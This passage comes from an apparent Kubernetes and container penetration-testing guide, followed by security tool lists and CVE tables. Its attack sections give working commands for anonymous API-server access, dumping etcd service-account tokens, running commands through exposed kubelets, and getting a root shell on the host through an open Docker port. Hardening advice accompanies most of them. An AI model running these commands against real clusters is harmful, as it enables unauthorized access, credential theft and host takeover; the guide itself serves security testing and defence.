Completed Connect Scan at 11:27, 0.00s elapsed (1 total ports)
NSE: Script scanning 10.0.200.18.
Initiating NSE at 11:27
Completed NSE at 11:27, 0.01s elapsed
Nmap scan report for 10.0.200.18
Host is up (0.00032s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-cert: Subject: commonName=kube-apiserver
| Subject Alternative Name: DNS:kmaster0, DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, IP Address:172.21.0.1, IP Address:10.0.200.18, IP Address:127.0.0.1
| Issuer: commonName=kubernetes
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-06-21T13:51:47
| Not valid after:  2023-06-21T13:51:48
| MD5:   6c95 9f2b c188 97d2 5d5a 1edf ba1d 20d7
| SHA-1: 818d 8bc2 ffd3 0782 6f9e cecb fdc1 b46c 7f16 2f5a
| -----BEGIN CERTIFICATE-----
| MIIDmzCCAoOgAwIBAgIIVVBbVX9SCR8wDQYJKoZIhvcNAQELBQAwFTETMBEGA1UE
| AxMKa3ViZXJuZXRlczAeFw0yMjA2MjExMzUxNDdaFw0yMzA2MjExMzUxNDhaMBkx
| FzAVBgNVBAMTDmt1YmUtYXBpc2VydmVyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA6ZEcUGIjywRPYk1k/1/t/Ga4fmgwUNW+cn2Q1s8tnc1U0ko+gpAi
| UYK0KMVA4KoOkZt1wtO2W0IaMUi2mJBdLed+lkNYtLYB9w+n4dlD+1VAbmn1KvVU
| fv2rI/eySfIsXAxv0zflSLxd40Yly6ZlWdW7VfCtzIhEOtQjJF8JCF5Jqed3g4vC
| 3ysGIKfutGh/JlTUpLQLwvRPG9GVRhleJhbphlGPgbsWskmQ2rYXH72rTZiF5EI3
| LBKSLT+fdyLQ+ByxNa8w955PucPH92ufyJXW/PwgjxzvmbaEyXEHrQipwHUl7nsG
| rexY2LRpgcgUmnE2B/n2VUdJ3qaASRvO2wIDAQABo4HqMIHnMA4GA1UdDwEB/wQE
| AwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8EAjAAMB8GA1UdIwQY
| MBaAFNTDUkxSkRCuR4K/AVjF0I4ZVHnsMIGQBgNVHREEgYgwgYWCCGttYXN0ZXIw
| ggprdWJlcm5ldGVzghJrdWJlcm5ldGVzLmRlZmF1bHSCFmt1YmVybmV0ZXMuZGVm
| YXVsdC5zdmOCJGt1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2NhbIIJ
| bG9jYWxob3N0hwSsFQABhwQKAMgShwR/AAABMA0GCSqGSIb3DQEBCwUAA4IBAQCz
| ZhvxXwOJ9/gfjHbR0UAbnFCDeh0BAEfZc2dtfwpDtTe0xVlU/Cxj1ilSVrQ+TkTG
| 98RHmJ5TG+1mrmVFTM6b3pBXMe3WEu3brsfIBhcSrsaRie1jnay/9E4+U3G7Pjis
| KiCAIWzNH3tHqCPU1MrMZxYOTYFBo/DsQ8LKMfbP35JLFVwxBT9cZrVrwAuC4e92
| XQFw2i00BkzvSmjeS2esWaO1oncqZE6s5z59XfXlbnvxHzJzCLWqOiMp3qk+XeDM
| TXlmwmbyowYfvUP2vhMNOGwpG7hHDG/xOoUgrBuBh46FvggtLIaN3xQ7Mb0sasRx
| id7eN1ODknzYHj0N1RqI
|_-----END CERTIFICATE-----

NSE: Script Post-scanning.
Initiating NSE at 11:27
Completed NSE at 11:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
           Raw packets sent: 4 (152B) | Rcvd: 1 (28B)
bash-5.1# 

bash-5.1# curl -k https://10.0.200.18:443/version
{
  "major": "1",
  "minor": "23",
  "gitVersion": "v1.23.8",
  "gitCommit": "a12b886b1da059e0190c54d09c5eab5219dd7acf",
  "gitTreeState": "clean",
  "buildDate": "2022-06-16T05:51:36Z",
  "goVersion": "go1.17.11",
  "compiler": "gc",
  "platform": "linux/amd64"
}bash-5.1# 

Note: Avoiding API Server Information Disclosure
The best way to reduce the risk of attackers fingerprinting clusters via the
API server is to restrict access to the port at a network level. Avoid putting
Kubernetes clusters directly onto the internet, and for internal deployments
consider, restricting access to the API server to specific sets of whitelisted source

IP addresses. The set of systems whitelisted for access will depend on how the
cluster is managed. Where deployments are handled using a CI/CD system
(such as Jenkins), it may be possible to limit API server access to those hosts
and jump host(s) used by systems administrators for administering the cluster.
It is also possible to remove unauthenticated access to API server endpoints
by setting the --anonymous-auth flag to false in the API server static manifest file
( /etc/kubernetes/manifests/kube-apiserver.yaml ); however, this can have
the effect of blocking some monitoring tools that make use of unauthenticated
access to operate.

- Exploiting Misconfigured API Servers

bash-5.1# kubectl get po -n kube-system
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "kube-system"
bash-5.1# kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://10.0.200.18:443 get pod -n kube-system
error: the server doesn't have a resource type "pod"
bash-5.1# 

NOTE: Exploiting Misconfigured API Servers
Where an API server has been misconfigured to allow anonymous access to
sensitive paths, exploiting this should be relatively simple. The kubectl tool
can be configured to access a specific API server from the command line.
For this to work, there are a couple of options that need to be specified:
--insecure-skip-tls-verify
This allows the user to trust unverified certificates. Alternatively, to install the
files for the private certificate authority used, there’s information at kubernetes
.io/docs/concepts/security/controlling-access/ .
--username=system:unauthenticated
The API server needs a username to be provided for access, in this case the
generic group for unauthenticated users.
-s
Use this switch to specify the host and port to connect to.
The whole command looks like this:
kubectl --insecure-skip-tls-verify --username=system:unauthenticated
-shttps://[IP]:6443 get po -n kube-system
NOTE: In addition to the standard API server, Kubernetes also supports an option
for an “insecure” API server. If configured, this service provides complete access to the
cluster with no authentication or authorization. Although it is not commonly configured,
the default for Kubernetes (as of 1.18) is to have this listen on localhost on the API server.
Once you have established that you have access to the API server without
authentication, it’s just a question of establishing what rights you have and
how that can be leveraged. That’s usually done by role-based access control
(RBAC); 
```

#### 2.2.Attacking etcd
```
- etcd Information Discovery

bash-5.1# curl -k https://10.0.200.18:2379/version
curl: (35) error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate

Exploiting Misconfigured etcd Servers

bash-5.1# etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://10.0.200.18:2379 get / --prefix --keys-only
Error: context deadline exceeded

bash-5.1# etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://10.0.200.18:2379 get /registry/secrets/kube-system/daemon-set-controller-token-[RAND]
Error: context deadline exceeded

The area in the previous line that says [RAND] will be a set of five alphanumeric
characters that vary per installation. This will return the service account token
information. There are some nonprintable characters in the output that are a
result of how the data is stored in etcd , but it is possible to extract the important
value, which will start ey.... This is a JWT token that can then be used when
communicating using kubectl , for example:

kubectl --token="[TOKEN]" -s https://10.0.200.18:6443 --insecure-skip-tls-verify get po -n kube-system

Note: Preventing Unauthorized etcd Access
etcd can be configured to restrict access to clients that present a certifi-
cate signed by a specific certificate authority. The --trusted-ca-file and
--client-cert-auth flags should always be configured on etcd to ensure that
this restriction is in place.
In a standard Kubeadm cluster, the options would look like this:
--client-cert-auth=true
--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
Additionally, it is important to note that etcd will trust any certificate signed
by the specified CA, so it is important to ensure that this CA is only used for
etcd authentication and not for other purposes. With Kubernetes, this means
that multiple CAs are needed to separate the main Kubernetes CA from the CA
used for the connection from the API server to etcd .
```

#### 2.3. Attacking the Kubelet

```
- Kubelet Information Discovery

bash-5.1# curl http://10.0.200.18:10255/pods/ | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
curl: (7) Failed to connect to 10.0.200.18 port 10255 after 6 ms: Connection refused

Exploiting Misconfigured Kubelets
curl https://[IP]:10250/run/[namespace]/[pod name]/[container name] -k
-XPOST -d "cmd=[command]"

This will execute the command as the user running the pod; it’s the equivalent
of using kubectl exec to execute a command in a running container.
To make use of commands similar to the previous, the following information
can be filled in to requests to the API:
[namespace] The Kubernetes namespace of the pod
[pod name] The name of the pod the container belongs to
[container name] The name of the container to execute the command in
[command] The name of the command to be run
The kubelet has other available endpoints that can be used, if they have
been made available unauthenticated or an attacker has been able to get valid
credentials for the kubelet. As an alternative to manual exploitation, Cyberark
released a tool called kubeletctl ( github.com/cyberark/kubeletctl ) that can
automate the process of using the kubelet API.

Note: Preventing Unauthenticated Kubelet Access
The read-only kubelet can be disabled by setting the read-only-port flag to 0.
Access to the read-write kubelet should be restricted to authenticated users,
anonymous authentication should be disabled, and the authorization-mode
flag should be set to Webhook and not AlwaysAllow .
The stanzas in a kubelet configuration file on a kubeadm cluster (held in /
var/lib/kubelet/config.yaml by default) would look like 

#### kubelet Authentication and Authorization Configuration
root@kmaster0:/var/lib/kubelet# cat config.yaml 
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: false
  webhook:
    cacheTTL: 0s
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook
  webhook:
    cacheAuthorizedTTL: 0s
    cacheUnauthorizedTTL: 0s
...
...
```

#### 2.4.Attackers - External Checklist

```
External attackers are typically looking for listening services. The list below is likely container related service ports and notes on testing/attacking them.

## 2375/TCP - Docker

This is the default insecure Docker port. It's an HTTP REST API, and usually access results in root on the host.

### Testing with Docker CLI

The easiest way to attack this is just use the docker CLI.

* `docker run -H tcp://[IP]:2375 info` - This will confirm access and return some information about the host
* `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - From [this](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) post. This will drop you into a root shell on the host.


## 2376/TCP - Docker

This is the default port for the Docker daemon where it requires credentials (client certificate), so you're unlikely to get far without that. If you do have the certificate and key for access :-

* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 info` - format for the info command to confirm access.
* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - root on the host


## 443/TCP, 6443/TCP, 8443/TCP - Kubernetes API server

Typical ports for the Kubernetes API server.

### Testing for access

Access to the `/version` endpoint will often work without valid credentials (using curl), as this is made available to unauthenticated users.

* `kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:[PORT] version` - Test for access with kubectl
* `curl -k https://[IP]:[PORT]/version` - Test for access with curl

### Checking permissions

It's possible that unauthenticated users have been provided more access. You can check what permissions you have with

* `kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:[PORT] auth can-i --list`

### Getting privileged access to cluster nodes

In the event that you have create pods access without authentication, see abowe k8s-manifests for useful approaches.


## 2379/TCP - etcd

The authentication model used by etcd, when supporting a Kubernetes cluster, is relatively straightforward. It uses client certificate authentication where **any** certificate issued by it's trusted CA will provide full access to all data. In terms of attacks, there are two options unauthenticated access and authenticated acces.

### Unauthenticated Access

A good general test for this is to use curl to access the `/version` endpoint. Although most endpoints don't respond well to curl in etcdv3, this one will and it'll tell you whether unauthenticated access is possible or not.

bash
curl [IP]:2379/version


If that returns version information, it's likely you can get unauthenticated access to the database. A good first step is to drop all the keys in the database, using etcdctl. First you need to set this environment variable so that etcdctl knows it's talking to a v3 server.

bash
export ETCDCTL_API=3


Then this command will enumerate all the keys in  the database

bash
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get / --prefix --keys-only

with a list of keys to hand the next step is generally to find useful information, for further attacks.

## 5000/TCP - Docker Registry

Generally the goal of attacking a Docker registry is not to compromise the service itself, but to gain access to either read sensitive information stored in container images and/or modify stored container images.

### Enumerating repositories/images

Whilst you can do this with just curl, it's probably more efficient to use some of the [registry interaction tools](tools_list.md#container-registry-tooling). For example  `go-pillage-reg` will dump a list of the repositories in a a registry as well as the details of all the manifests of those images.


## 10250/TCP - kubelet

The main kubelet port will generally be present on all worker nodes, and *may* be present on control plane nodes, if the control plane components are deployed as containers (e.g. with kubeadm). Usually authentication to this port is via client certificates and there's usually no authorization in place.

Trying the following request should either give a 401 (showing that a valid client certificate is required) or return some JSON metrics information (showing you have access to the kubelet port)

bash
curl -k https://[IP]:10250/metrics

Assuming you've got access you can then execute commands in any container running on that host. As the kubelet controls the CRI (e.g. Docker) it's typically going to provide privileged access to all the containers on the host.

The easiest way to do this is to use Cyberark's [kubeletctl](https://github.com/cyberark/kubeletctl). First scan the host to show which pods can have commands executed in them

bash
kubeletctl scan rce --server [IP]

Then you can use this command to execute commands in one or more of the vulnerable pods. just replace `whoami` with the command of your choice and fill in the details of the target pod, based on the information returned from the scan command

bash
 kubeletctl run "whoami" --namespace [NAMESPACE] --pod [POD] --container [CONTAINER] --server [IP]

If you don't have `kubeletctl` available but do have `curl` you can use it to do the same thing. First get the pod listing

bash
curl -k https://[IP]:10250/pods/ | jq

From that pull out the namespace, pod name and container name that you want to run a command in, then issue this command filling in the blanks appropriately

bash
https://[IP]:10250/run/[Namespace]/[Pod]/[Container] -k -XPOST -d "cmd=[COMMAND]"

## 10255/TCP - kubelet read-only

The kubelet read-only port is generally only seen on older clusters, but can provide some useful information disclosure if present. It's an HTTP API which will have no encryption and no authentication requirements on it, so it's easy to interact with.

The most useful endpoint will be `/pods/` so retrieving it using curl (as below) and looking at the output for useful information, is likely to be the best approach.


bash
curl http://[IP]:10255/pods/ | jq

```

### 3.Container & Kubernetes Security Tools (DevSecOps Tools)

#### Container Attack Surface Assessment & Breakout Tools

Useful tools to run inside a container to assess the sandbox that's in use, and exploit some common breakout issues.

* [amicontained](https://github.com/genuinetools/amicontained) -  will show you information about the container runtime and rights you have
* [ConMachi](https://github.com/nccgroup/ConMachi/) - Pentester focused container attack surface assessment tool
* [deepce](https://github.com/stealthcopter/deepce) - Docker Enumeration, Escalation of Privileges and Container Escapes 
* [botb](https://github.com/brompwnie/botb) - Container breakout assessment tool. Can automatically exploit common issues like the Docker socket mount
* [keyctl-unmask](https://github.com/antitree/keyctl-unmask) - Tool that specifically focuses on grabbing kernel keyring entries from containers that allow the keyctl syscall

#### Container Vulnerability Scanning Tools

* [Trivy](https://github.com/aquasecurity/trivy) - Vulnerability and IaC scanner
* [Grype](https://github.com/anchore/grype) - Container vulnerability scanner
* [clair](https://github.com/quay/clair) - Container vulnerability scanner

#### IaC Scanning Tools that cover container formats

* [Trivy](https://github.com/aquasecurity/trivy) - Vulnerability and IaC scanner
* [Checkov](https://github.com/bridgecrewio/checkov) - IaC scanner
* [KICS](https://github.com/Checkmarx/kics) - IaC scanner

#### Docker Security Tools

* [docker bench](https://github.com/docker/docker-bench-security) - Docker CIS Benchmark assessment tool
* [Dockle](https://github.com/goodwithtech/dockle) - Container Image Linter

#### Container Runtime Security Tools

* [Tracee](https://github.com/aquasecurity/tracee). Container runtime security tooling
* [Falco](https://github.com/falcosecurity/falco). Container runtime security tooling
* [Kubearmor](https://github.com/kubearmor/KubeArmor). Container runtime security enforcement tool

#### Container Registry Tools

* [reg](https://github.com/genuinetools/reg) - Tool for interacting with Container registries
* [regclient](https://github.com/regclient/regclient) - Another tool for interacting with container registries
* [go-pillage-registries](https://github.com/nccgroup/go-pillage-registries) - Tool to search the manifests and configuration for images in a registry for potentially sensitive information


#### Container Orchestration Tools

##### RBAC Assessment Tools

* [kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can) - Tool that lets you ask "who can" do things in RBAC, e.g. who can get secrets
* [rakkess](https://github.com/corneliusweig/rakkess) - Shows the RBAC permissions available to a user as a list
* [rback](https://github.com/team-soteria/rback) - tool for graphical representation of RBAC permissions in a kubernetes cluster
* [rbac-tool](https://github.com/alcideio/rbac-tool) - RBAC Tool for Kubernetes
* [kubiScan](https://github.com/cyberark/KubiScan) - Tool to scan Kubernetes clusters for risky permissions
* [krane](https://github.com/appvia/krane) - Kubernetes RBAC static analysis & visualisation tool

##### Kubernetes Security Auditing Tools

* [kube-bench](https://github.com/aquasecurity/kube-bench) - Tool to assess compliance with the CIS benchmark for various Kubernetes distributions
* [kubescape](https://github.com/armosec/kubescape) - Kubernetes security assessment tool
* [kubeaudit](https://github.com/Shopify/kubeaudit) - Kubernetes security assessment tool focusing on workload security
* [kubesec](https://github.com/controlplaneio/kubesec) - Kubernetes security assessment tool focusing on workload security
* [kubescore](https://github.com/zegl/kube-score) - Kubernetes security and reliability assessment tool focusing on workload security.

##### Kubernetes Penetration Testing Tools

* [kube-hunter](https://github.com/aquasecurity/kube-hunter) - Tool to test and exploit standard Kubernetes Security Vulnerabilities
* [kubestrike](https://github.com/vchinnipilli/kubestrike) - Security auditing tool for Kubernetes looks at Authenticated and unauthenticated scanning
* [peirates](https://github.com/inguardians/peirates) - Kubernetes container breakout tool
* [kdigger](https://github.com/quarkslab/kdigger) - Kubernetes breakout/discovery tool

##### Kubernetes Post-Exploitation Tools

* [kubesploit](https://github.com/cyberark/kubesploit) - Kubesploit is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in Golang, focused on containerized environments


##### Kubelet Tools

* [kubeletctl](https://github.com/cyberark/kubeletctl) - This is a good tool to automate the process of assessing a kubelet instance. If the instance is vulnerable it can also carry out some exploit tasks

##### etcd Tools

* [auger](https://github.com/jpbetz/auger) - Tool for decoding information pulled directly from the etcd database

##### Security Observability Tools

* [ThreatMapper](https://github.com/deepfence/ThreatMapper). Cloud + Container Security observability

##### Training Tools

If you're looking to practice with some of the tools here, in a safe environment, there are projects to help with that.

* [Kube Security Lab](https://github.com/raesene/kube_security_lab) - Basic set of Kubernetes security scenarios implemented in Ansible with KinD
* [Kubernetes Simulator](https://github.com/kubernetes-simulator/simulator) - AWS based Kubernetes cluster environment with different vulnerability scenarios
* [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat) - Focuses on vulnerable deployments on top of an existing cluster. Also available on line [with Katacoda](https://katacoda.com/madhuakula/scenarios/kubernetes-goat)

### 4.Container CVE List

#### Kubernetes


|CVE-ID   |CVSS Score   |Title   |Affected Versions   | Patched Versions |
|---|---|---|---|---|
|[CVE-2020-8561](https://groups.google.com/g/kubernetes-security-announce/c/RV2IhwcrQsY) | 4.1 | Webhook redirect in kube-apiserver | All | No Patch Available |
|[CVE-2021-25741](https://groups.google.com/g/kubernetes-security-announce/c/nyfdhK24H7s)| 8.8 | Symlink Exchange Can Allow Host Filesystem Access | v1.22.0 - v1.22.1, v1.21.0 - v1.21.4, v1.20.0 - v1.20.10, Earlier than v1.19.15 | v1.22.2, v1.21.5, v1.20.11, v1.19.15 |
|[CVE-2021-25740](https://groups.google.com/g/kubernetes-security-announce/c/WYE9ptrhSLE)| 3.1 | Endpoint & EndpointSlice permissions allow cross-Namespace forwarding   |  All | No Patch Available (mitigations in advisory) |
|[CVE-2021-25737](https://groups.google.com/g/kubernetes-security-announce/c/xAiN3924thY)| 2.7 | Holes in EndpointSlice Validation Enable Host Network Hijack  |v1.21.0, v1.20.0 - v1.20.6, v1.19.0 - v1.19.10, v1.16.0 - v1.18.18  | v1.21.1, v1.20.7, v1.19.11, v1.18.19  |
|[CVE-2021-25736](https://groups.google.com/g/kubernetes-security-announce/c/lIoOPObO51Q)| 5.8 | Windows kube-proxy LoadBalancer contention  | v1.20.0 - v1.20.5, v1.19.0 - v1.19.9, v1.18.0 - v1.18.17  | v1.21.0, v1.20.6, v1.19.10, v1.18.18 |
|[CVE-2020-8562](https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY)| 2.2 | Bypass of Kubernetes API Server proxy TOCTOU | v1.21.0, v1.20.0 - v1.20.6, v1.19.0 - v1.19.10, v1.18.0 - v1.18.18  | No Patch Available (mitigations in advisory)  |
|[CVE-2021-25735](https://groups.google.com/g/kubernetes-security-announce/c/FKAGqT4jx9Y)| 6.5 | Validating Admission Webhook does not observe some previous fields | v1.20.0 - v1.20.5, v1.19.0 - v1.19.9, Earlier than v1.18.17  | v1.21.0, v1.20.6, v1.19.10, v1.18.18 |
|[CVE-2020-8554](https://groups.google.com/g/kubernetes-security-announce/c/iZWsF9nbKE8)| 6.3 | Man in the middle using LoadBalancer or ExternalIPs  | All  | No Patch Available (mitigations in advisory) |
|[CVE-2020-8565](https://groups.google.com/g/kubernetes-security-announce/c/9d0gPe7SCM8)| 4.7  | Token Leaks in verbose logs | all v1.19 and earlier  | v1.20.0 |
|[CVE-2020-8559](https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs)| 6.4  | Privilege escalation from compromised node to cluster | v1.18.0-1.18.5, v1.17.0-1.17.8, v1.16.0-1.16.12, all v1.15 and earlier  | v1.18.6, v1.17.9, v1.16.13 |
|[CVE-2020-8558](https://groups.google.com/g/kubernetes-security-announce/c/B1VegbBDMTE)| 5.4  | Kubernetes: Node setting allows for neighboring hosts to bypass localhost boundary | v1.18.0-1.18.3, v1.17.0-1.17.6, earlier than <1.16.10  | v1.18.4,v1.17.7, v1.16.11 |
|[CVE-2020-8557](https://groups.google.com/g/kubernetes-security-announce/c/cB_JUsYEKyY)| 5.5  | Node disk DOS by writing to container /etc/hosts | v1.18.0-1.18.5, v1.17.0-1.17.8, earlier than  v1.16.13  | v1.18.6, v1.17.9, v1.16.13  |
|[CVE-2020-8555](https://groups.google.com/g/kubernetes-security-announce/c/kEK27tqqs30)| 6.3 | Half-Blind SSRF in kube-controller-manager  | v1.18.0, v1.17.0 - v1.17.4, v1.16.0 - v1.16.8, earlier than < v1.15.11  | v1.18.1, v1.17.5, v1.16.9, v1.15.12  |
|[CVE-2019-11254](https://groups.google.com/g/kubernetes-security-announce/c/wuwEwZigXBc)| 6.5  | denial of service vulnerability from malicious YAML payloads  |v1.17.0-v1.17.2, v1.16.0-v1.16.6, earlier than v1.15.10  | v1.17.3, v1.16.7, v1.15.10  |
|[CVE-2020-8552](https://groups.google.com/g/kubernetes-security-announce/c/2UOlsba2g0s)| 5.3 | Denial of service from authenticated requests to the Kube API server| v1.17.0-v1.17.2, v1.16.0-v1.16.6, earlier than v1.15.10  | v1.17.3, v1.16.7, v1.15.10
|[CVE-2020-8551](https://groups.google.com/g/kubernetes-security-announce/c/2UOlsba2g0s)| 4.3  | Denial of service from authenticated requests to the Kubelet |v1.17.0-v1.17.2, v1.16.0-v1.16.6, v1.15.0-v1.15.10 | v1.17.3, v1.16.7, v1.15.10|
|[CVE-2019-11253](https://groups.google.com/g/kubernetes-security-announce/c/jk8polzSUxs)| 7.5   | Denial of Service from malicious YAML or JSON payloads  | v1.16.0-v1.16.1, v1.15.0-v1.15-4, v1.14.0-v1.14.7, earlier than v1.13.11  | v1.16.2,v1.15.5,v1.14.8,v1.13.12 |
|[CVE-2019-11251](https://groups.google.com/g/kubernetes-security-announce/c/6vTrp6tVpHo)|  5.7  | kubectl cp could lead to files being create outside its destination directory   | v1.15.0-v1.15.3, v1.14.0-v1.14.6, earlier than v1.13.10  | v1.16.0, v1.15.4, v1.14.7, v1.13.11 |
|[CVE-2019-11248](https://groups.google.com/g/kubernetes-security-announce/c/pKELclHIov8)| 8.2  | The debugging endpoint /debug/pprof is exposed over the unauthenticated Kubelet healthz port  | v1.14.0 - v1.14.4, v1.13.0 - v1.13.8, earlier than v1.12.10   | v1.15.0, v1.14.4, v1.13.8, and v1.12.10   |
|[CVE-2019-11247](https://groups.google.com/g/kubernetes-security-announce/c/vUtEcSEY6SM)| 8.1  | API server allows access to custom resources via wrong scope  | v1.15.0 - v1.15.1, v1.14.0 - v1.14.5, earlier than v1.13.9  | v1.15.2, v1.14.5, v1.13.9   |
|[CVE-2019-11249](https://groups.google.com/g/kubernetes-security-announce/c/vUtEcSEY6SM)| 6.5   | kubectl cp potential directory traversal  | v1.15.0 - v1.15.1, v1.14.0 - v1.14.5, earlier than v1.13.9  | v1.15.2, v1.14.5, v1.13.9 |
|[CVE-2019-11246](https://groups.google.com/g/kubernetes-security-announce/c/NLs2TGbfPdo)| 6.5  | kubectl cp could lead to files being create outside its destination directory  |  v1.14.0-v1.14.1, v1.13.0-v1.13.5, earlier than v1.12.9  | v1.12.9, v1.13.6, v1.14.2   |
|[CVE-2019-11245](https://groups.google.com/g/kubernetes-security-announce/c/lAs07uKLq2k)| 7.8  | Security regression in Kubernetes kubelet  | v1.13.6, v1.14.2   | v1.13.7, v1.14.3   |
|[CVE-2019-1002101](https://groups.google.com/g/kubernetes-security-announce/c/OYFV1hiDE2w)| 5.5  | kubectl - potential directory traversal in kubectl cp  | v1.13.0-v1.13.4, v1.12.0-v1.12.6, earlier than v1.11.9   | v1.11.9, v1.12.7, v1.13.5, v1.14.0    |
|[CVE-2019-1002100](https://groups.google.com/g/kubernetes-security-announce/c/i-HEIs8WC5w)|6.5 | kube-apiserver authenticated DoS risk  | v1.13.0 - v1.13.3, v1.12.0 - v1.12.5, earlier than v1.11.8    | v1.11.8, v1.12.6, v1.13.4    |
|[CVE-2018-1002105](https://groups.google.com/g/kubernetes-security-announce/c/fm1MkmubMoI)|9.8 | kuberneretes Aggregated API credential re-use  | v1.12.0-v1.12.2, v1.11.0-v1.11.4, earlier than v1.10.11   | v1.10.11, v1.11.5, v1.12.3   |

- Information from [kubernetes-security-announce](https://groups.google.com/g/kubernetes-security-announce)

#### runc

##### CVE-2016-9962 - container escape via ptrace

- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-9962)

##### CVE-2019-5736 - Runc Privileged Escalation

- [Mitre](CVE-2019-5736)
- [Dragon Sector Blog](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html) - This is from the people who found the issue, describing it.

##### CVE-2019-16884 - Apparmor restriction bypass

- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-16884)

##### CVE-2021-30465 - Container Filesystem Breakout via Directory Traversal

- [GitHub advisory](https://github.com/advisories/GHSA-c3xm-pvg7-gh7r)
- [Etienne Champtar's Blog](http://blog.champtar.fr/runc-symlink-CVE-2021-30465/) - This is from the researcher that found it.

#### ContainerD

|CVE-ID   |CVSS Score   |Title   |Affected Versions   | Patched Versions | More Info |
| [CVE-2022-24769](https://github.com/containerd/containerd/security/advisories/GHSA-c9cp-9c75-9v8c) | 5.9 | Default inheritable capabilities for linux container should be empty | <= 1.5.10, 1.6.0, 1.6.1 | 1.5.11, 1.6.2 |  |
| [CVE-2022-23648](https://github.com/containerd/containerd/security/advisories/GHSA-crp2-qrr5-8pq7) | 7.5 | containerd CRI plugin: Insecure handling of image volumes | <= 1.4.12, 1.5.0 - 1.5.9, 1.6.0 | 1.4.13, 1.5.10, 1.6.1 | [PoC repo](https://github.com/raesene/CVE-2022-23648-POC) |
| [CVE-2021-43816](https://github.com/containerd/containerd/security/advisories/GHSA-mvff-h3cj-wj9c) | 9.1 | containerd CRI plugin: Unprivileged pod using `hostPath` can side-step SELinux | >= 1.5.0, < 1.5.9 | 1.5.9 |  |
| [CVE-2021-41103](https://github.com/containerd/containerd/security/advisories/GHSA-c2h3-6mxw-7mvq) | 5.9 | nsufficiently restricted permissions on container root and plugin directories | <1.4.11,<1.5.7 | 1.4.11,1.5.7 |  |
| [CVE-2021-32760](https://github.com/containerd/containerd/security/advisories/GHSA-c72p-9xmj-rx3w) | 6.3 | Archive package allows chmod of file outside of unpack target directory | <=1.4.7, <=1.5.3  | 1.5.4, 1.4.8  |  |
| [CVE-2021-21334](https://github.com/containerd/containerd/security/advisories/GHSA-6g2q-w5j3-fwh4) | 6.3 | containerd CRI plugin: environment variables can leak between containers  | <=1.3.9, <= 1.4.3 | 1.3.10, 1.4.4 |  |
| [CVE-2020-15157](https://github.com/containerd/containerd/security/advisories/GHSA-742w-89gc-8m9c) | 6.1 | containerd v1.2.x can be coerced into leaking credentials during image pull | < 1.3.0  | 1.2.14, 1.3.0  | [Darkbit Blog Post](https://darkbit.io/blog/cve-2020-15157-containerdrip) |
| [CVE-2020-15257](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4) | 5.2 | containerd-shim API exposed to host network containers | <=1.3.7, 1.4.0, 1.4.1 | 1.3.9, 1.4.3 | [NCC Group Technical Vulnerability Discussion](https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/) |


#### Docker

|CVE-ID   |CVSS Score   |Title   |Affected Versions   | Patched Versions | More Info |
| [CVE-2021-21285](https://github.com/moby/moby/security/advisories/GHSA-6fj5-m822-rqx8) | 6.5 | Docker daemon crash during image pull of malicious image | < 19.03.15, < 20.10.3 | 19.03.15, 20.10.3  |   |
| [CVE-2021-21284](https://github.com/moby/moby/security/advisories/GHSA-7452-xqpj-6rpc) | 6.8 | Access to remapped root allows privilege escalation to real root | < 19.03.15, < 20.10.3 | 19.03.15, 20.10.3 |  |
| [CVE-2020-27534](https://nvd.nist.gov/vuln/detail/CVE-2020-27534) | 5.3 | Docker calls os.OpenFile with a potentially unsafe qemu-check temporary pathname  | < 19.03.9 | 19.03.9 |  |
| [CVE-2019-14271](https://nvd.nist.gov/vuln/detail/CVE-2019-14271) | 9.8 | docker cp vulnerability | 19.03 | 19.03.1 | [Tenable Blog Post](https://www.tenable.com/blog/cve-2019-14271-proof-of-concept-for-docker-copy-docker-cp-vulnerability-released) |
| [CVE-2019-13509](https://nvd.nist.gov/vuln/detail/CVE-2019-13509) | 7.5 | Docker Engine in debug mode may sometimes add secrets to the debug log  | < 18.09.8  | 18.09.8   |  |
